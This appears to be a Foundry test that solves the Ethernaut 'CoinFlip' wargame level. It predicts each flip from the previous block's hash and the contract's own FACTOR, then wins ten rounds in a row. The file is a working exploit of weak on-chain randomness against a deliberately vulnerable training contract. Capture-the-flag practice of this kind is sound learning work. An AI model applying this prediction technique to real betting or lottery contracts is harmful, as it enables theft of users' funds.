pragma solidity ^0.8.0;

import "src/core/Ethernaut.sol";
import "src/levels/03CoinFlip/CoinFlipFactory.sol";
import "src/levels/03CoinFlip/CoinFlip.sol";
import 'openzeppelin-contracts/utils/math/SafeMath.sol';
import "forge-std/Test.sol";
import "forge-std/Vm.sol";

contract CoinFlipTest is Test{
    using SafeMath for uint256;
    Ethernaut ethernaut = new Ethernaut();
    address myEoaAddress = 0xB5Da00630Ca5fdE4d9cED2fcdA0C607cE198F159;
    function setUp() public {
        vm.deal(myEoaAddress, 1000 ether);
    }

    function testCoinFlipAttack() public{
        CoinFlipFactory coinFlipFactory = new CoinFlipFactory();
        ethernaut.registerLevel(coinFlipFactory);
        address instanceAddress = ethernaut.createLevelInstance(coinFlipFactory);
        CoinFlip instance = CoinFlip(payable(instanceAddress));
        vm.startPrank(myEoaAddress);
        uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
        uint256 blockValue = 0;
        uint256 coinFlip = 0;
        bool side = false;
        for(uint256 i=1; i<11; i++){
            vm.roll(i);
            blockValue = uint256(blockhash(i.sub(1)));
            uint256 coinFlip = blockValue.div(FACTOR);
            bool side = coinFlip == 1 ? true : false;
            instance.flip(side);
        }
        bool result = coinFlipFactory.validateInstance(payable(instanceAddress), myEoaAddress);
        assertTrue(result);
        vm.stopPrank();
    }
}